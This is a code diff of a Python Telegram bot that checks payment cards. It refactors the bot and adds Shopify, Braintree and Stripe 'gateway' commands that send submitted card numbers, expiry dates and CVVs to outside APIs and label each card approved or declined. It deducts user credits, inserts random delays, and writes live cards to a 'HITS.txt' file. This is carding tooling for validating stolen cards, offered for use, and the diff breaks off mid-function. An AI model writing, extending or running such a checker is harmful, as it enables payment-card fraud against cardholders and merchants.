@@ -1,3 +1,4 @@
+import io
 import telebot
 from telebot import types
 import requests
@@ -31,6 +32,8 @@ OWNER_ID = 6521162324  # Your Telegram user ID
 GATEWAY_API_CC = "http://69.197.134.89:5001/gate=site/key=d4rk/cc="
 GATEWAY_API_CHK = "https://api-sp-storm.onrender.com/gate=stripe4/keydarkwaslost/cc="
 VBV_API_URL = "https://vbv-by-dark-waslost.onrender.com/key=darkwaslost/cc="
+SHOPIFY_API_URL = "https://api-cc-stormx-1.onrender.com/key=cytron/cc="
+B4_API_URL = "YOUR_B4_API_URL"  # Replace with your actual B4 API URL
 
 BIN_LOOKUP_API = "https://bins.antipublic.cc/bins/"
 
@@ -44,7 +47,8 @@ last_credit_refresh = time.time()
 bot_active = True
 checker_active = True
 
-# Firebase functions with error handling
+# ====================== UTILITY FUNCTIONS ======================
+
 def read_firebase(path):
     url = f"{FIREBASE_BASE_URL}/{path}.json"
     try:
@@ -74,7 +78,6 @@ def update_firebase(path, data):
         print(f"Firebase update error ({path}): {str(e)}")
         return False
 
-# Initialize Firebase paths
 def init_firebase():
     paths = [
         "users_pixel",
@@ -89,7 +92,6 @@ def init_firebase():
         if not read_firebase(path):
             write_firebase(path, {})
 
-# User verification
 def is_member(user_id):
     try:
         group_status = bot.get_chat_member(GROUP_ID, user_id).status
@@ -120,7 +122,6 @@ def is_restricted(user_id):
             return False
     return False
 
-# Credit management
 def refresh_credits():
     global last_credit_refresh
     current_time = time.time()
@@ -156,363 +157,6 @@ def deduct_credit(user_id):
         users[str(user_id)]['total_checks'] = users[str(user_id)].get('total_checks', 0) + 1
     return write_firebase("users_pixel", users)
 
-# Card checking functions
-def check_cc_cc(cc):
-    try:
-        card = cc.replace('/', '|')
-        lista = card.split("|")
-        cc = lista[0]
-        mm = lista[1]
-        yy = lista[2]
-        if "20" in yy:
-            yy = yy.split("20")[1]
-        cvv = lista[3]
-        
-        # Get bin info
-        bin_info = get_bin_info(cc)
-        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
-        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
-        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
-        card_type = f"{bin_info.get('type', 'UNKNOWN')} {bin_info.get('level', '')}".strip() if bin_info else 'UNKNOWN'
-        
-        # Prepare card for API
-        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
-        
-        try:
-            response = requests.get(f"{GATEWAY_API_CC}{formatted_cc}", timeout=300)
-            if response.status_code == 200:
-                try:
-                    data = response.json()
-                except json.JSONDecodeError:
-                    return {
-                        'status': 'ERROR',
-                        'card': card,
-                        'message': 'Invalid API response',
-                        'brand': brand,
-                        'country': f"{country_name} {country_flag}",
-                        'type': card_type,
-                        'gateway': 'Site Based [1$]'
-                    }
-                    
-                status = data.get('status', 'Declined').replace('Declined ❌', 'DECLINED').replace('Declined', 'DECLINED')
-                message = data.get('response', 'Your card was declined.')
-                
-                if 'Approved' in status:
-                    status = 'APPROVED'
-                    return {
-                        'status': 'APPROVED',
-                        'card': card,
-                        'message': message,
-                        'brand': brand,
-                        'country': f"{country_name} {country_flag}",
-                        'type': card_type,
-                        'gateway': 'Site Based [1$]'
-                    }
-                else:
-                    return {
-                        'status': 'DECLINED',
-                        'card': card,
-                        'message': message,
-                        'brand': brand,
-                        'country': f"{country_name} {country_flag}",
-                        'type': card_type,
-                        'gateway': 'Site Based [1$]'
-                    }
-            else:
-                return {
-                    'status': 'ERROR',
-                    'card': card,
-                    'message': f'API Error: {response.status_code}',
-                    'brand': brand,
-                    'country': f"{country_name} {country_flag}",
-                    'type': card_type,
-                    'gateway': 'Site Based [1$]'
-                }
-        except requests.exceptions.Timeout:
-            return {
-                'status': 'ERROR',
-                'card': card,
-                'message': 'API Timeout',
-                'brand': brand,
-                'country': f"{country_name} {country_flag}",
-                'type': card_type,
-                'gateway': 'Site Based [1$]'
-            }
-        except Exception as e:
-            return {
-                'status': 'ERROR',
-                'card': card,
-                'message': str(e),
-                'brand': brand,
-                'country': f"{country_name} {country_flag}",
-                'type': card_type,
-                'gateway': 'Site Based [1$]'
-            }
-            
-    except Exception as e:
-        return {
-            'status': 'ERROR',
-            'card': cc,
-            'message': 'Invalid Input',
-            'brand': 'UNKNOWN',
-            'country': 'UNKNOWN 🌐',
-            'type': 'UNKNOWN',
-            'gateway': 'Site Based [1$]'
-        }
-
-def check_chk_cc(cc):
-    try:
-        card = cc.replace('/', '|')
-        lista = card.split("|")
-        cc = lista[0]
-        mm = lista[1]
-        yy = lista[2]
-        if "20" in yy:
-            yy = yy.split("20")[1]
-        cvv = lista[3]
-        
-        # Get bin info
-        bin_info = get_bin_info(cc)
-        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
-        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
-        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
-        card_type = f"{bin_info.get('type', 'UNKNOWN')} {bin_info.get('level', '')}".strip() if bin_info else 'UNKNOWN'
-        
-        # Prepare card for API
-        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
-        
-        try:
-            response = requests.get(f"{GATEWAY_API_CHK}{formatted_cc}", timeout=300)
-            if response.status_code == 200:
-                try:
-                    data = response.json()
-                except json.JSONDecodeError:
-                    return {
-                        'status': 'ERROR',
-                        'card': card,
-                        'message': 'Invalid API response',
-                        'brand': brand,
-                        'country': f"{country_name} {country_flag}",
-                        'type': card_type,
-                        'gateway': 'Stripe Auth'
-                    }
-                    
-                status = data.get('status', 'Declined')
-                message = data.get('response', 'Your card was declined.')
-                
-                if 'Approved' in status:
-                    status = 'APPROVED'
-                    return {
-                        'status': 'APPROVED',
-                        'card': card,
-                        'message': message,
-                        'brand': brand,
-                        'country': f"{country_name} {country_flag}",
-                        'type': card_type,
-                        'gateway': 'Stripe Auth'
-                    }
-                else:
-                    return {
-                        'status': 'DECLINED',
-                        'card': card,
-                        'message': message,
-                        'brand': brand,
-                        'country': f"{country_name} {country_flag}",
-                        'type': card_type,
-                        'gateway': 'Stripe Auth'
-                    }
-            else:
-                return {
-                    'status': 'ERROR',
-                    'card': card,
-                    'message': f'API Error: {response.status_code}',
-                    'brand': brand,
-                    'country': f"{country_name} {country_flag}",
-                    'type': card_type,
-                    'gateway': 'Stripe Auth'
-                }
-        except requests.exceptions.Timeout:
-            return {
-                'status': 'ERROR',
-                'card': card,
-                'message': 'API Timeout',
-                'brand': brand,
-                'country': f"{country_name} {country_flag}",
-                'type': card_type,
-                'gateway': 'Stripe Auth'
-            }
-        except Exception as e:
-            return {
-                'status': 'ERROR',
-                'card': card,
-                'message': str(e),
-                'brand': brand,
-                'country': f"{country_name} {country_flag}",
-                'type': card_type,
-                'gateway': 'Stripe Auth'
-            }
-            
-    except Exception as e:
-        return {
-            'status': 'ERROR',
-            'card': cc,
-            'message': 'Invalid Input',
-            'brand': 'UNKNOWN',
-            'country': 'UNKNOWN 🌐',
-            'type': 'UNKNOWN',
-            'gateway': 'Stripe Auth'
-        }
-
-def check_vbv_cc(cc):
-    try:
-        # Clean and parse the card
-        card = cc.replace('/', '|')
-        lista = card.split("|")
-        if len(lista) < 4:
-            return {
-                'status': 'ERROR',
-                'card': cc,
-                'message': 'Invalid card format. Use CC|MM|YY|CVV',
-                'brand': 'UNKNOWN',
-                'country': 'UNKNOWN 🌐',
-                'type': 'UNKNOWN',
-                'gateway': 'VBV Check'
-            }
-            
-        cc_num = lista[0].strip()
-        mm = lista[1].strip()
-        yy = lista[2].strip()
-        cvv = lista[3].strip()
-        
-        # Validate card number
-        if not cc_num.isdigit() or len(cc_num) not in (13, 15, 16):
-            return {
-                'status': 'ERROR',
-                'card': card,
-                'message': 'Invalid card number',
-                'brand': 'UNKNOWN',
-                'country': 'UNKNOWN 🌐',
-                'type': 'UNKNOWN',
-                'gateway': 'VBV Check'
-            }
-        
-        # Handle year format
-        if len(yy) == 2:
-            current_year_short = datetime.now().year % 100
-            yy = f"20{yy}" if int(yy) >= current_year_short else f"19{yy}"
-        elif len(yy) != 4:
-            return {
-                'status': 'ERROR',
-                'card': card,
-                'message': 'Invalid year format (use YY or YYYY)',
-                'brand': 'UNKNOWN',
-                'country': 'UNKNOWN 🌐',
-                'type': 'UNKNOWN',
-                'gateway': 'VBV Check'
-            }
-            
-        # Get BIN info
-        bin_info = get_bin_info(cc_num[:6])
-        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
-        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
-        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
-        card_type = f"{bin_info.get('type', 'UNKNOWN')} {bin_info.get('level', '')}".strip() if bin_info else 'UNKNOWN'
-        
-        # Prepare API request
-        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
-        
-        try:
-            response = requests.get(
-                f"{VBV_API_URL}{formatted_cc}",
-                timeout=30,
-                headers={'User-Agent': 'Mozilla/5.0'}
-            )
-            
-            # Check response
-            if response.status_code == 200:
-                try:
-                    data = response.json()
-                    
-                    # Improved status detection
-                    status_text = str(data.get('status', '')).lower()
-                    if any(x in status_text for x in ['passed', 'success', 'verified', 'live']):
-                        status = 'APPROVED'
-                    elif any(x in status_text for x in ['fail', 'declined', 'dead']):
-                        status = 'DECLINED'
-                    else:
-                        status = 'ERROR'
-                        
-                    return {
-                        'status': status,
-                        'card': f"{cc_num}|{mm}|{yy[-2:]}|{cvv}",  # Return in short year format
-                        'message': data.get('response', 'No response'),
-                        'brand': brand,
-                        'country': f"{country_name} {country_flag}",
-                        'type': card_type,
-                        'gateway': 'VBV Check'
-                    }
-                    
-                except json.JSONDecodeError:
-                    return {
-                        'status': 'ERROR',
-                        'card': card,
-                        'message': f'Invalid API response: {response.text[:200]}',
-                        'brand': brand,
-                        'country': f"{country_name} {country_flag}",
-                        'type': card_type,
-                        'gateway': 'VBV Check'
-                    }
-            else:
-                return {
-                    'status': 'ERROR',
-                    'card': card,
-                    'message': f'API Error {response.status_code}',
-                    'brand': brand,
-                    'country': f"{country_name} {country_flag}",
-                    'type': card_type,
-                    'gateway': 'VBV Check'
-                }
-                
-        except requests.exceptions.Timeout:
-            return {
-                'status': 'ERROR',
-                'card': card,
-                'message': 'API timeout (30s)',
-                'brand': brand,
-                'country': f"{country_name} {country_flag}",
-                'type': card_type,
-                'gateway': 'VBV Check'
-            }
-        except Exception as e:
-            return {
-                'status': 'ERROR',
-                'card': card,
-                'message': f'API Error: {str(e)}',
-                'brand': brand,
-                'country': f"{country_name} {country_flag}",
-                'type': card_type,
-                'gateway': 'VBV Check'
-            }
-            
-    except Exception as e:
-        return {
-            'status': 'ERROR',
-            'card': cc,
-            'message': f'Processing error: {str(e)}',
-            'brand': 'UNKNOWN',
-            'country': 'UNKNOWN 🌐',
-            'type': 'UNKNOWN',
-            'gateway': 'VBV Check'
-        }
-    
-@bot.message_handler(commands=['vbv'])
-def vbv_command(message):
-    handle_card_check(message, 'vbv')
-
-@bot.message_handler(func=lambda m: m.text and m.text.startswith('.vbv '))
-def dot_vbv_command(message):
-    handle_card_check(message, 'vbv')
-
 def get_bin_info(bin_number):
     max_retries = 3
     for attempt in range(max_retries):
@@ -525,7 +169,40 @@ def get_bin_info(bin_number):
             time.sleep(1)
     return None
 
-# Message formatting
+def parse_card_input(text):
+    # Improved card pattern matching
+    card_pattern = r'(\d{13,19})[\s|/]*(\d{1,2})[\s|/]*(\d{2,4})[\s|/]*(\d{3,4})'
+    match = re.search(card_pattern, text)
+    
+    if not match:
+        return None
+    
+    cc = match.group(1)
+    mm = match.group(2).zfill(2)  # Ensure 2-digit month
+    yy = match.group(3)
+    cvv = match.group(4)
+    
+    # Handle year format (2-digit or 4-digit)
+    if len(yy) == 2:
+        current_year_short = datetime.now().year % 100
+        input_year = int(yy)
+        if input_year >= current_year_short - 10:  # Consider years within 10 years range
+            yy = '20' + yy  # 22 → 2022
+        else:
+            yy = '20' + yy  # Default to 20xx for all 2-digit years
+    elif len(yy) != 4:
+        return None
+    
+    # Validate month
+    if not (1 <= int(mm) <= 12):
+        return None
+    
+    # Validate CVV
+    if not (3 <= len(cvv) <= 4):
+        return None
+    
+    return f"{cc}|{mm}|{yy}|{cvv}"
+
 def format_card_message(result, user, elapsed_time):
     status_display = f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if result['status'] == 'APPROVED' else f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
     
@@ -547,7 +224,6 @@ def format_card_message(result, user, elapsed_time):
     )
     return message
 
-# Logging functions
 def log_card_check(user_id, card, status, response, gateway):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     log_entry = {
@@ -588,7 +264,351 @@ def log_card_check(user_id, card, status, response, gateway):
         stats['declined'] = stats.get('declined', 0) + 1
     write_firebase("stats_pixel", stats)
 
-def handle_card_check(message, command_type='cc'):
+# ====================== CARD CHECKING FUNCTIONS ======================
+
+def check_cc_generic(cc, api_url, gateway_name):
+    try:
+        card = parse_card_input(cc)
+        if not card:
+            return {
+                'status': 'ERROR',
+                'card': cc,
+                'message': 'Invalid card format',
+                'brand': 'UNKNOWN',
+                'country': 'UNKNOWN 🌐',
+                'type': 'UNKNOWN',
+                'gateway': gateway_name
+            }
+        
+        # Get bin info
+        bin_info = get_bin_info(card.split('|')[0])
+        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
+        card_type = f"{bin_info.get('type', 'UNKNOWN')} {bin_info.get('level', '')}".strip() if bin_info else 'UNKNOWN'
+        
+        try:
+            response = requests.get(f"{api_url}{card}", timeout=300)
+            if response.status_code == 200:
+                try:
+                    data = response.json()
+                except json.JSONDecodeError:
+                    return {
+                        'status': 'ERROR',
+                        'card': card,
+                        'message': 'Invalid API response',
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': gateway_name
+                    }
+                    
+                status = data.get('status', 'Declined').replace('Declined ❌', 'DECLINED').replace('Declined', 'DECLINED')
+                message = data.get('response', 'Your card was declined.')
+                
+                if 'Approved' in status:
+                    status = 'APPROVED'
+                    return {
+                        'status': 'APPROVED',
+                        'card': card,
+                        'message': message,
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': gateway_name
+                    }
+                else:
+                    return {
+                        'status': 'DECLINED',
+                        'card': card,
+                        'message': message,
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': gateway_name
+                    }
+            else:
+                return {
+                    'status': 'ERROR',
+                    'card': card,
+                    'message': f'API Error: {response.status_code}',
+                    'brand': brand,
+                    'country': f"{country_name} {country_flag}",
+                    'type': card_type,
+                    'gateway': gateway_name
+                }
+        except requests.exceptions.Timeout:
+            return {
+                'status': 'ERROR',
+                'card': card,
+                'message': 'API Timeout',
+                'brand': brand,
+                'country': f"{country_name} {country_flag}",
+                'type': card_type,
+                'gateway': gateway_name
+            }
+        except Exception as e:
+            return {
+                'status': 'ERROR',
+                'card': card,
+                'message': str(e),
+                'brand': brand,
+                'country': f"{country_name} {country_flag}",
+                'type': card_type,
+                'gateway': gateway_name
+            }
+            
+    except Exception as e:
+        return {
+            'status': 'ERROR',
+            'card': cc,
+            'message': 'Invalid Input',
+            'brand': 'UNKNOWN',
+            'country': 'UNKNOWN 🌐',
+            'type': 'UNKNOWN',
+            'gateway': gateway_name
+        }
+
+def check_cc_cc(cc):
+    return check_cc_generic(cc, GATEWAY_API_CC, "Site Based [1$]")
+
+def check_chk_cc(cc):
+    return check_cc_generic(cc, GATEWAY_API_CHK, "Stripe Auth")
+
+def check_vbv_cc(cc):
+    return check_cc_generic(cc, VBV_API_URL, "VBV Check")
+
+def check_shopify_cc(cc):
+    try:
+        card = parse_card_input(cc)
+        if not card:
+            return {
+                'status': 'ERROR',
+                'card': cc,
+                'message': 'Invalid card format',
+                'brand': 'UNKNOWN',
+                'country': 'UNKNOWN 🌐',
+                'type': 'UNKNOWN',
+                'gateway': 'Shopify + graphQL [10$]'
+            }
+        
+        # Get bin info
+        bin_info = get_bin_info(card.split('|')[0])
+        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
+        card_type = f"{bin_info.get('type', 'UNKNOWN')} {bin_info.get('level', '')}".strip() if bin_info else 'UNKNOWN'
+        
+        # Random delay between 20-30 seconds
+        delay_time = random.uniform(20, 30)
+        time.sleep(delay_time)
+        
+        try:
+            response = requests.get(f"{SHOPIFY_API_URL}{card}", timeout=35)
+            if response.status_code == 200:
+                try:
+                    data = response.json()
+                    status = data.get('status', 'Declined').replace('Declined 🚫', 'DECLINED').replace('Declined', 'DECLINED')
+                    message = data.get('response', 'Your card was declined.')
+                    
+                    # Proper status determination
+                    is_declined = any(
+                        decline_word in status.lower() 
+                        for decline_word in ['decline', 'declined', 'failed', 'error', 'generic']
+                    )
+                    
+                    return {
+                        'status': 'DECLINED' if is_declined else 'APPROVED',
+                        'card': card,
+                        'message': message,
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': 'Shopify + graphQL [10$]'
+                    }
+                    
+                except json.JSONDecodeError:
+                    return {
+                        'status': 'ERROR',
+                        'card': card,
+                        'message': 'Invalid API response',
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': 'Shopify + graphQL [10$]'
+                    }
+            else:
+                return {
+                    'status': 'ERROR',
+                    'card': card,
+                    'message': f'API Error: {response.status_code}',
+                    'brand': brand,
+                    'country': f"{country_name} {country_flag}",
+                    'type': card_type,
+                    'gateway': 'Shopify + graphQL [10$]'
+                }
+        except requests.exceptions.Timeout:
+            return {
+                'status': 'ERROR',
+                'card': card,
+                'message': 'API Timeout',
+                'brand': brand,
+                'country': f"{country_name} {country_flag}",
+                'type': card_type,
+                'gateway': 'Shopify + graphQL [10$]'
+            }
+        except Exception as e:
+            return {
+                'status': 'ERROR',
+                'card': card,
+                'message': str(e),
+                'brand': brand,
+                'country': f"{country_name} {country_flag}",
+                'type': card_type,
+                'gateway': 'Shopify + graphQL [10$]'
+            }
+            
+    except Exception as e:
+        return {
+            'status': 'ERROR',
+            'card': cc,
+            'message': 'Invalid Input',
+            'brand': 'UNKNOWN',
+            'country': 'UNKNOWN 🌐',
+            'type': 'UNKNOWN',
+            'gateway': 'Shopify + graphQL [10$]'
+        }
+
+def check_b4_cc(cc):
+    try:
+        card = parse_card_input(cc)
+        if not card:
+            return {
+                'status': 'ERROR',
+                'card': cc,
+                'message': 'Invalid card format',
+                'brand': 'UNKNOWN',
+                'country': 'UNKNOWN 🌐',
+                'type': 'UNKNOWN',
+                'gateway': 'Braintree Primium Auth 2'
+            }
+        
+        # Get bin info
+        bin_info = get_bin_info(card.split('|')[0])
+        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
+        card_type = f"{bin_info.get('type', 'UNKNOWN')} {bin_info.get('level', '')}".strip() if bin_info else 'UNKNOWN'
+        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        
+        try:
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Accept': 'application/json',
+                'Connection': 'keep-alive'
+            }
+            
+            # Increased timeout to 60 seconds
+            response = requests.get(B4_API_URL.format(card), headers=headers, timeout=300)
+            
+            if response.status_code == 200:
+                try:
+                    data = response.json()
+                except json.JSONDecodeError:
+                    return {
+                        'status': 'ERROR',
+                        'card': card,
+                        'message': 'Invalid API response',
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': 'Braintree Primium Auth 2'
+                    }
+                    
+                status = data.get('status', '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱')
+                message = data.get('response', 'Declined.')
+                
+                # Improved status detection
+                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success' , '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱']):
+                    status = 'APPROVED'
+                    with open('HITS.txt','a') as hits:
+                        hits.write(card+'\n')
+                    return {
+                        'status': 'APPROVED',
+                        'card': card,
+                        'message': message,
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': 'Braintree Primium Auth 2'
+                    }
+                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error' '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱']):
+                    return {
+                        'status': 'DECLINED',
+                        'card': card,
+                        'message': message,
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': 'Braintree Primium Auth 2'
+                    }
+                else:
+                    return {
+                        'status': 'ERROR',
+                        'card': card,
+                        'message': 'Unknown response from API',
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': 'Braintree Primium Auth 2'
+                    }
+            else:
+                return {
+                    'status': 'ERROR',
+                    'card': card,
+                    'message': f'API Error: {response.status_code}',
+                    'brand': brand,
+                    'country': f"{country_name} {country_flag}",
+                    'type': card_type,
+                    'gateway': 'Braintree Primium Auth 2'
+                }
+        except requests.exceptions.RequestException as e:
+            error_msg = str(e)
+            if "Read timed out" in error_msg:
+                return {
+                    'status': 'ERROR',
+                    'card': card,
+                    'message': 'API Timeout (60s) - Server may be busy',
+                    'brand': brand,
+                    'country': f"{country_name} {country_flag}",
+                    'type': card_type,
+                    'gateway': 'Braintree Primium Auth 2'
+                }
+            else:
+                return {
+                    'status': 'ERROR',
+                    'card': card,
+                    'message': f'Request failed: {str(e)}',
+                    'brand': brand,
+                    'country': f"{country_name} {country_flag}",
+                    'type': card_type,
+                    'gateway': 'Braintree Primium Auth 2'
+                }
+            
+    except Exception as e:
+        return {
+            'status': 'ERROR',
+            'card': cc,
+            'message': f'Invalid Input: {str(e)}',
+            'brand': 'UNKNOWN',
+            'country': 'UNKNOWN 🌐',
+            'type': 'UNKNOWN',
+            'gateway': 'Braintree Primium Auth 2'
+        }
+
+# ====================== COMMAND HANDLERS ======================
+
+def handle_card_check(message, check_function, gateway_name):
     if not bot_active or not checker_active:
         bot.reply_to(message, "❌ Card checking is currently disabled by admin.")
         return
@@ -614,52 +634,21 @@ def handle_card_check(message, command_type='cc'):
     else:
         text = message.text
     
-    # Improved card pattern matching
-    card_pattern = r'(\d{13,19})[\s|/]*(\d{1,2})[\s|/]*(\d{2,4})[\s|/]*(\d{3,4})'
-    match = re.search(card_pattern, text)
+    # Remove command prefix if present
+    if text.startswith(('.cc ', '.chk ', '.vbv ', '.sh ', '.b4 ')):
+        text = text[4:].strip()
+    elif text.startswith(('/cc ', '/chk ', '/vbv ', '/sh ', '/b4 ')):
+        text = text[4:].strip()
     
-    if not match:
+    card = parse_card_input(text)
+    if not card:
         bot.reply_to(message, "❌ Invalid card format. Use CC|MM|YYYY|CVV or CC|MM|YY|CVV")
         return
-    
-    cc = match.group(1)
-    mm = match.group(2)
-    yy = match.group(3)
-    cvv = match.group(4)
-    
-    # Validate month
-    if not (1 <= int(mm) <= 12):
-        bot.reply_to(message, "❌ Invalid month (MM must be 01-12)")
-        return
-    
-    # Handle year format (2-digit or 4-digit)
-    if len(yy) == 2:
-        yy = '20' + yy if int(yy) < 30 else '19' + yy
-    elif len(yy) != 4:
-        bot.reply_to(message, "❌ Invalid year format (use YY or YYYY)")
-        return
-    
-    # Validate CVV
-    if len(cvv) not in [3, 4]:
-        bot.reply_to(message, "❌ Invalid CVV (must be 3 or 4 digits)")
-        return
-    
-    card = f"{cc}|{mm}|{yy}|{cvv}"
-    
-    # Set gateway based on command type
-    if command_type == 'cc':
-        gateway = "Site Based [1$]"
-    elif command_type == 'chk':
-        gateway = "Stripe Auth"
-    elif command_type == 'vbv':
-        gateway = "VBV Check"
-    else:
-        gateway = "Unknown Gateway"
     
     initial_msg = (
         f"↝ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠....\n\n"
         f"𝐂𝐚𝐫𝐝\n  ↳ <code>{card}</code>\n"
-        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway}</i>\n"
+        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{gateway_name}</i>\n"
         f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>Fetching</i>"
     )
     sent_msg = bot.reply_to(message, initial_msg, parse_mode='HTML')
@@ -673,24 +662,7 @@ def handle_card_check(message, command_type='cc'):
     
     def process_check():
         try:
-            # Route to the correct checking function
-            if command_type == 'cc':
-                result = check_cc_cc(card)
-            elif command_type == 'chk':
-                result = check_chk_cc(card)
-            elif command_type == 'vbv':
-                result = check_vbv_cc(card)
-            else:
-                result = {
-                    'status': 'ERROR',
-                    'card': card,
-                    'message': 'Invalid command type',
-                    'brand': 'UNKNOWN',
-                    'country': 'UNKNOWN 🌐',
-                    'type': 'UNKNOWN',
-                    'gateway': gateway
-                }
-            
+            result = check_function(card)
             elapsed_time = time.time() - start_time
             result_msg = format_card_message(result, user, elapsed_time)
             
@@ -721,18 +693,63 @@ def handle_card_check(message, command_type='cc'):
     
     threading.Thread(target=process_check).start()
 
+# Command handlers for different check types
 @bot.message_handler(commands=['cc'])
 def cc_command(message):
-    handle_card_check(message, 'cc')
+    handle_card_check(message, check_cc_cc, "Site Based [1$]")
 
 @bot.message_handler(commands=['chk'])
 def chk_command(message):
-    handle_card_check(message, 'chk')
+    handle_card_check(message, check_chk_cc, "Stripe Auth")
 
-@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.cc ') or m.text.startswith('.chk ')))
-def dot_command(message):
-    command_type = 'cc' if message.text.startswith('.cc ') else 'chk'
-    handle_card_check(message, command_type)
+@bot.message_handler(commands=['vbv'])
+def vbv_command(message):
+    handle_card_check(message, check_vbv_cc, "VBV Check")
+
+@bot.message_handler(commands=['sh'])
+def sh_command(message):
+    handle_card_check(message, check_shopify_cc, "Shopify + graphQL [10$]")
+
+@bot.message_handler(commands=['b4'])
+def b4_command(message):
+    handle_card_check(message, check_b4_cc, "Braintree Primium Auth 2")
+
+# Dot command handlers
+@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.cc ') or m.text == '.cc'))
+def dot_cc_command(message):
+    handle_card_check(message, check_cc_cc, "Site Based [1$]")
+
+@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.chk ') or m.text == '.chk'))
+def dot_chk_command(message):
+    handle_card_check(message, check_chk_cc, "Stripe Auth")
+
+@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.vbv ') or m.text == '.vbv'))
+def dot_vbv_command(message):
+    handle_card_check(message, check_vbv_cc, "VBV Check")
+
+@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.sh ') or m.text == '.sh'))
+def dot_sh_command(message):
+    handle_card_check(message, check_shopify_cc, "Shopify + graphQL [10$]")
+
+@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.b4 ') or m.text == '.b4'))
+def dot_b4_command(message):
+    handle_card_check(message, check_b4_cc, "Braintree Primium Auth 2")
+
+# Add this with your other API endpoints
+AU_API_URL = "https://au-api-storm.onrender.com/gate=stripe5/key=wasdark/cc="
+
+# Add this checking function with your other check functions
+def check_au_cc(cc):
+    return check_cc_generic(cc, AU_API_URL, "Stripe Auth 2")
+
+# Add these command handlers with your other command handlers
+@bot.message_handler(commands=['au'])
+def au_command(message):
+    handle_card_check(message, check_au_cc, "Stripe Auth 2")
+
+@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.au ') or m.text == '.au'))
+def dot_au_command(message):
+    handle_card_check(message, check_au_cc, "Stripe Auth 2")
 
 # Start command and menu handlers
 @bot.message_handler(commands=['start'])
@@ -1159,295 +1176,6 @@ def ping_command(message):
         message_id=msg.message_id
     )
 
-def check_shopify_cc(cc):
-    try:
-        card = cc.replace('/', '|')
-        lista = card.split("|")
-        cc = lista[0]
-        mm = lista[1]
-        yy = lista[2]
-        if "20" in yy:
-            yy = yy.split("20")[1]
-        cvv = lista[3]
-        
-        # Get bin info
-        bin_info = get_bin_info(cc)
-        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
-        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
-        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
-        card_type = f"{bin_info.get('type', 'UNKNOWN')} {bin_info.get('level', '')}".strip() if bin_info else 'UNKNOWN'
-        
-        # Prepare card for API
-        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
-        
-        # Random delay between 20-30 seconds
-        delay_time = random.uniform(20, 30)
-        time.sleep(delay_time)
-        
-        try:
-            response = requests.get(f"https://api-cc-stormx-1.onrender.com/key=cytron/cc={formatted_cc}", timeout=35)
-            if response.status_code == 200:
-                try:
-                    data = response.json()
-                    status = data.get('status', 'Declined').replace('Declined 🚫', 'DECLINED').replace('Declined', 'DECLINED')
-                    message = data.get('response', 'Your card was declined.')
-                    
